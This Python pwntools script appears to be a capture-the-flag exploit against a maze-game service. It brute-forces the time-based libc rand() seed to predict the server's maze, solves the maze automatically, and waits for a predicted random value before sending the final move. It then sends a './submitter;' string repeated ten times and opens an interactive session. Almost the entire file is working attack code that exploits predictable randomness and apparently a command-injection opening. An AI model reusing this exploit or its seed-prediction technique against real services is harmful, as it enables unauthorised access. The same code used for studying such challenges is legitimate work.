#!/usr/bin/env python3

from pwn import *

PURE_PYMODE = False

if not PURE_PYMODE:
    from ctypes import CDLL
    libc = CDLL("libc.so.6")
    #libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

class RandState:
    def __init__(self):
        self.seed = 1

    def srand(self, seed):
        self.seed = seed

    def rand(self):
        self.seed = (self.seed * 1103515245 + 12345) & 0x7fffffff
        return self.seed >> 1


class RandState:
    def __init__(self):
        self.seed = 1

    def srand(self, seed):
        self.seed = (seed + 0x80000000) & 0xffffffff

    def rand(self):
        self.seed = (self.seed * 1103515245 + 12345) & 0xffffffff
        return (self.seed >> 16) & 0x7fff


_state = RandState()

def srand(seed):
    global PURE_PYMODE
    if PURE_PYMODE:
        _state.srand(seed)
        return
    libc.srand(seed) 

def rand():
    global PURE_PYMODE
    if PURE_PYMODE:
        return _state.rand()
    return libc.rand()


def solve_maze(maze):
    start_pos = find_start_position(maze)
    goal_pos = find_goal_position(maze)
    visited = set()
    path = []

    def dfs(current_pos):
        if current_pos == goal_pos:
            return True

        visited.add(current_pos)
        row, col = current_pos

        # Explore all possible neighbors (up, down, left, right)
        for dr, dc, direction in [(-1, 0, 'n'), (1, 0, 's'), (0, -1, 'w'), (0, 1, 'e')]:
            new_row, new_col = row + dr, col + dc

            # Check if the new position is valid
            if is_valid_position(maze, new_row, new_col) and (new_row, new_col) not in visited:
                path.append((new_row, new_col, direction))

                if dfs((new_row, new_col)):
                    return True

                path.pop()

        return False

    path.append((start_pos[0], start_pos[1], ''))
    dfs(start_pos)

    return path

def is_valid_position(maze, row, col):
    rows = len(maze)
    cols = len(maze[0])

    return 0 <= row < rows and 0 <= col < cols and maze[row][col] != '#'


def find_start_position(maze):
    for row in range(len(maze)):
        for col in range(len(maze[row])):
            if maze[row][col] == '@':
                return row, col


def find_goal_position(maze):
    for row in range(len(maze)):
        for col in range(len(maze[row])):
            if maze[row][col] == '*':
                return row, col

# Example maze
example = '''
############################# 
#@#...................#.....# 
#.#.###.###########.###.#.#.* 
#.#...#...#.......#.#...#.#.# 
#.#######.#.#####.###.###.#.# 
#.......#.#.#...#.#...#...#.# 
#######.#.#.#.#.#.#.###.###.# 
#...#.#.#.....#.#...#...#...# 
#.#.#.#.#######.#####.####### 
#.#...#...#.......#.#.......# 
#.#######.#######.#.#######.# 
#.......#.....#.......#.....# 
#.###.#######.#.#######.###.# 
#...#.....#...#.#.......#...# 
###.###.###.#####.#######.### 
#.#...#...#.#.....#.....#...# 
#.###.###.#.#.#######.#.###.# 
#.......#.#...#.....#.#.#...# 
#.#######.#####.###.###.#.### 
#...#.#...#.......#...#.#.#.# 
###.#.#.###.#####.###.#.#.#.# 
#.#...#.....#...#...#.#.#.#.# 
#.###.#########.###.#.#.#.#.# 
#.....#.......#...#.#...#.#.# 
#.#####.#.###.#.#.#.#####.#.# 
#...#...#.#.#...#.#.#.....#.# 
###.#####.#.#####.#.#.#####.# 
#.........#.......#.........# 
#############################
'''

def solve(mz_data):
    maze = [x.strip() for x in mz_data.strip().split('\n')]
    solution = solve_maze(maze)

    if solution:
        print("Path found:")
        solver = []

        for row, col, direction in solution[1:]:
            solver.append(direction)
            #maze[row] = maze[row][:col] + '|' + maze[row][col+1:]
            #print(''.join(maze[row]))

        #print(solver)
        return solver
    else:
        print("No path found.")
        quit()

def generate_maze(maze, a2, a3, a4):
    def rand_range(start, end):
        ret = rand() % (end - start + 1) + start
        return ret

    maze[30 * a2 + a3] = 46
    v19 = [0, -1, 0, 0, 1, 0, -1, 1]
    for i in range(3, 0, -1):
        v15 = rand_range(0, i)
        v16 = v19[2 * i - 1]
        v17 = v19[2 * i]
        v19[2 * i - 1] = v19[2 * v15 - 1]
        v19[2 * i] = v19[2 * v15]
        v19[2 * v15 - 1] = v16
        v19[2 * v15] = v17

    for j in range(4):
        v13 = 2 * v19[2 * j - 1] + a2
        v14 = 2 * v19[2 * j] + a3
        if 0 < v13 < 29 and 0 < v14 < 29 and maze[v13 * 30 + v14] == 35:
            maze[(v19[2 * j - 1] + a2) * 30 + v19[2 * j] + a3] = 46
            generate_maze(maze, v13, v14, 0)

    if a4:
        if rand_range(0, 1):
            while True:
                v11 = rand_range(1, 28)
                if maze[810 + v11] == 46:
                    maze[840 + v11] = 42
                    break
        else:
            while True:
                v12 = rand_range(1, 28)
                if maze[v12 * 30 + 27] == 46:
                    maze[v12 * 30 + 28] = 42
                    break

        for k in range(30):
            maze[870 + k] = 32
            maze[k * 30 + 29] = 32

def calculate_maze_gen():
    maze = bytearray(30 * 30)

    for y in range(0, 30):
        for x in range(0, 30):
              maze[x + y * 30] = 35;

    generate_maze(maze, 1, 1, 1)

    maze = maze.decode('latin')
    mz_data = []

    for y in range(0, 30):
        for x in range(0, 30):
            mz_data.append(maze[x + y * 30])
        mz_data.append('\n')

    return ''.join(mz_data)

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

seed = int(time.time()) & 0xFFFFFFFF
io = remote(HOST, int(PORT))
#io = process('./c1')

io.recvuntilS('torment:')
io.send('a')
mz_data = io.recvuntilS('torment:')

marker = '\n#'
mz_data = mz_data[mz_data.find(marker) + 1: mz_data.rfind('#') + 1]
found = False

for window in range(-0x200, 0x2000):
    srand(seed + window)
    calculated_mz_data = calculate_maze_gen()
    if calculated_mz_data.strip() == mz_data.replace('@', '.').strip():
        print('Found maze at ', seed + window)
        found = True
        break

assert found

solution = solve(mz_data)
#print(solution)

terminator = solution[-1]

rand()

# remain last step
for direction in solution[:-1]:
    io.sendline(direction.encode('latin'))
    rand()
    #x = io.recvuntilS('torment:')
    #print(x)

print('Trying 1212 force...')
# loop until 1212
for retry in range(0, 10000):
    random_mod = rand() % 1213

    if random_mod != 1212:
        io.sendline(b'v')
        info = io.recvuntilS('torment:')

    else:
        print('sending finalizer')
        io.sendline(terminator.encode('latin'))
        io.recvuntilS('You have solved the maze!')
        time.sleep(0.5)
        io.sendline(('./submitter;' * 10).encode('latin'))
        io.interactive()
        quit()

print('Failed')









